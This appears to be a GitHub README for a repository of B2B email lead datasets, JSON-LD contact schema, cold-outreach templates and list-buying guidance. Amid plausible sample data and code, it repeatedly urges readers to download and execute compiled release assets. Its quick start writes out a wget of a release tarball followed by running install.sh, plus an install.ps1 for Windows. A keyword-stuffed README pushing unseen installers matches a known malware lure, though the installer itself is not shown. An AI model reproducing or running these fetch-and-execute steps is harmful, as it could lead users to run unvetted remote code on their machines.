# LLM-ready Mailing Lists for B2B Leads and Cold Outreach

[![Releases](https://img.shields.io/github/v/release/loganabacate/mailinglists?label=Releases&color=blue)](https://github.com/loganabacate/mailinglists/releases)

![Email header image](https://source.unsplash.com/1200x300/?email,marketing,b2b)

This repo collects structured contact data, sample datasets, SEO content, JSON-LD schema, and practical guides for ethical list buying, lead generation, and email outreach. It targets AI engineers, marketers, and developers who need clean, labeled email and B2B lead data for training, analysis, or campaign use.

Badges
- Topics: bulk-email-list, business-email-list, buy-b2b-email-list, buy-email-contacts, buy-email-list, cold-email-leads, email-database, email-marketing-list, lead-generation-data, targeted-email-list
- Releases: download and run the release asset from https://github.com/loganabacate/mailinglists/releases

What you get
- Sample datasets in CSV, JSON, and Parquet.
- JSON-LD contact schema and SEO-ready snippets.
- Email templates for cold outreach and nurture sequences.
- Guides on ethical list buying, consent, and data hygiene.
- Scripts for parsing, validating, and enriching contact data.
- Minimal CLI for converting CSV to JSON-LD and filtering leads.

Table of contents
- Features
- Repository layout
- Data schema
- JSON-LD example
- Sample CSV format
- Quick start (download and execute release)
- Usage examples (Python, Node)
- SEO content and JSON-LD for pages
- Ethical buying and outreach guide
- Lead generation playbook
- Tools and scripts
- Contributing
- License

Features
- LLM-ready: datasets labeled and cleaned for model training.
- Structured: uniform schema across formats (CSV, JSON, Parquet).
- Actionable: templates and scripts for outreach and enrichment.
- Compliant: guidance on consent, suppression lists, and lawful emailing.
- Reusable: clear JSON-LD for SEO and structured data needs.

Repository layout
- datasets/
  - b2b-sample-contacts.csv
  - firmographics.parquet
  - clean-leads.json
- schema/
  - contact-schema.json
  - jsonld-contact-example.jsonld
- scripts/
  - csv2jsonld.sh
  - validate_contacts.py
  - enrich_contacts.js
- docs/
  - ethical-buying.md
  - outreach-templates.md
  - seo-structured-data.md
- examples/
  - python-usage.ipynb
  - node-usage.js
- releases/
  - compiled release assets (download and run from Releases page)

Data schema (contact)
- contact_id: unique id (string)
- first_name: string
- last_name: string
- email: string (validated)
- title: job title
- company: organization name
- company_size: numeric bracket or label
- industry: NAICS or category
- country: ISO country code
- city: city name
- created_at: ISO 8601 timestamp
- source: source id or tag
- consent: boolean or enum (explicit, inferred, none)
- tags: array of strings
- score: numeric lead score (0-100)

JSON-LD contact example
```json
{
  "@context": "https://schema.org",
  "@type": "Person",
  "givenName": "Jamie",
  "familyName": "Smith",
  "email": "jamie.smith@example.com",
  "jobTitle": "Head of Marketing",
  "affiliation": {
    "@type": "Organization",
    "name": "Acme Co",
    "employee": 120
  },
  "address": {
    "@type": "PostalAddress",
    "addressLocality": "San Francisco",
    "addressCountry": "US"
  }
}
```

Sample CSV (first lines)
```csv
contact_id,first_name,last_name,email,title,company,company_size,industry,country,city,created_at,source,consent,tags,score
c0001,Jamie,Smith,jamie.smith@example.com,Head of Marketing,Acme Co,101-500,software,US,San Francisco,2024-02-15T12:34:56Z,procured,explicit,"SaaS,NorthAmerica",85
c0002,Alex,Garcia,alex.garcia@example.com,Product Manager,DataWorks,11-50,data,US,Austin,2024-03-01T09:20:11Z,leadgen,inferred,"B2B,Product",60
```

Quick start (download and execute release)
- Visit the Releases page and get the latest release asset:
  https://github.com/loganabacate/mailinglists/releases
- Download the release archive or installer. The release contains:
  - compiled scripts
  - sample datasets
  - install script (install.sh)
- Run the installer on a Unix-like host:
```bash
wget https://github.com/loganabacate/mailinglists/releases/download/v1.0/mailinglists-release.tar.gz
tar xzf mailinglists-release.tar.gz
cd mailinglists-release
chmod +x install.sh
./install.sh
```
- On Windows, extract the archive and run the provided `install.ps1` in PowerShell.

Usage examples

Python: load CSV and filter by lead score
```python
import pandas as pd

df = pd.read_csv("datasets/b2b-sample-contacts.csv", parse_dates=["created_at"])
high_score = df[df["score"] >= 75]
high_score.to_json("high_value_leads.json", orient="records", lines=False)
```

Node.js: parse CSV and output JSON-LD
```js
const fs = require('fs');
const csv = require('csv-parse/sync');

const input = fs.readFileSync('datasets/b2b-sample-contacts.csv');
const rows = csv.parse(input, { columns: true });
const jsonld = rows.map(r => ({
  "@context": "https://schema.org",
  "@type": "Person",
  "givenName": r.first_name,
  "familyName": r.last_name,
  "email": r.email,
  "jobTitle": r.title,
  "affiliation": { "@type": "Organization", "name": r.company }
}));
fs.writeFileSync('out/contacts.jsonld', JSON.stringify(jsonld, null, 2));
```

SEO content and JSON-LD for pages
- Use the contact JSON-LD on contact pages, team pages, and press pages.
- Add Organization schema with contactPoints for support and sales.
- Provide FAQ schema for common questions about list buying and consent.
- Keep schema precise and avoid stuffing.

SEO snippet example
```html
<script type="application/ld+json">
{
  "@context":"https://schema.org",
  "@type":"Organization",
  "name":"Acme Co",
  "url":"https://acme.example",
  "contactPoint":[
    {"@type":"ContactPoint","contactType":"sales","email":"sales@acme.example"}
  ]
}
</script>
```

Ethical buying and outreach guide
- Check consent: prefer contacts with explicit opt-in. Mark inferred leads clearly.
- Use suppression lists: always exclude unsubscribes and known do-not-contact lists.
- Validate emails: run SMTP checks and syntax validation before campaigns.
- Rate limit sends: keep daily volume per sending domain to avoid blocks.
- Track deliverability: monitor bounces and spam complaints.
- Keep metadata: store source, purchase date, and compliance proof for each contact.
- Respect local law: confirm data use aligns with GDPR, CAN-SPAM, CASL, or other rules that apply.

Cold outreach templates (sequence)
- Subject line test: keep subject short, personal, and specific.
- Email 1 (value): one-line intro, one benefit, CTA to book a quick call.
- Email 2 (follow): reference prior email, short case, CTA to reply.
- Email 3 (social proof): mention client or metric, CTA to view a case study.
- Email 4 (breakup): short, clear, final ask. Offer to stop outreach.

Example outreach email
Hi {first_name},

I work with teams at {company}. We help reduce acquisition cost with targeted campaigns for {industry} companies.

If reducing CPL by 20% in the next quarter matters, are you open to a 10-minute call?

Best,
{sender_name}

Lead scoring and enrichment
- Score factors: title fit, company size, industry match, email engagement, recency.
- Assign weight to each factor and normalize to 0-100.
- Enrich with firmographics: scrape company website or use third-party APIs to add revenue, tech stack, and recent funding events.
- Update scores on every campaign interaction.

Tools and scripts
- scripts/validate_contacts.py: run schema validation and flag missing fields.
- scripts/csv2jsonld.sh: convert CSV to JSON-LD using contact schema.
- scripts/enrich_contacts.js: call enrichment API and add firmographic fields.
- CLI sample:
```bash
./scripts/csv2jsonld.sh datasets/b2b-sample-contacts.csv out/contacts.jsonld
python3 scripts/validate_contacts.py out/contacts.jsonld
node scripts/enrich_contacts.js out/contacts.jsonld
```

Model training and LLM use
- Use structured fields as input features for supervised models.
- Use prompts that reference explicit fields to reduce hallucination.
- Keep a clear train/validation/test split by contact_id or time-based split.
- Avoid including PII in public training data. Mask or pseudonymize personal emails when publishing models.

Privacy and compliance checklist
- Tag consent status on import.
- Log source and transaction for purchased lists.
- Implement suppression list checks at send-time.
- Provide easy unsubscribe links in every email.
- Archive opt-out requests and honor them promptly.

Contributing
- Open an issue for data format requests or schema changes.
- Fork, make your changes, and open a pull request.
- Add test data for new formats in datasets/.
- Keep changes backwards compatible with the contact schema.

Releases and binary assets
- Download the release asset and execute the installer or scripts from:
  https://github.com/loganabacate/mailinglists/releases
- The Releases page contains packaged datasets, compiled utilities, and install scripts.

License
- MIT License. See LICENSE file for full text.

Contact
- File issues on GitHub for bugs or feature requests.
- Use pull requests for contributions to datasets or scripts.

Images and assets
- Header image from Unsplash (query: email, marketing).
- Badge from img.shields.io linking to releases.

EOF